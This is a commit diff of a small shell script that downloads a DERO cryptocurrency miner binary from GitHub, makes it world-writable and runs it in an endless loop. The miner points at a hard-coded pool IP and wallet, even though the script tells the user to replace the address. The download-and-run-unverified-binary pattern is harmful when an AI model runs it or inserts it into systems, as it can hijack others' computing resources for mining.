d0e7e88474749c775dcc6ee50d2c6e4bf8210d29
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-10-31 21:12:28 +0700

    Update deroid.sh

--- deroid.sh
+++ deroid.sh
@@ -1,9 +1,9 @@
-wget https://github.com/angkii/m/raw/main/astrominer
-chmod 777 astrominer
+wget https://github.com/angkii/m/raw/main/dero
+chmod 777 dero
 
 #!/bin/bash
 echo "Replace YOUR_ADDRESS to run the miner"
 while :; do
-    ./astrominer -w dero1qykdhx37h72gy9hl48xjjvdagjyh7afzsr8tn0r54tem8dq5evxncqqfxsnj5.DERO -r 170.187.197.220:443 -p stratum;
+    ./dero -w deroi1qykdhx37h72gy9hl48xjjvdagjyh7afzsr8tn0r54tem8dq5evxncq9pvfz92xcls7cggsdpg2nq9ekva7.DERO -r 170.187.197.220:443 -p stratum;
     sleep 5;
 done
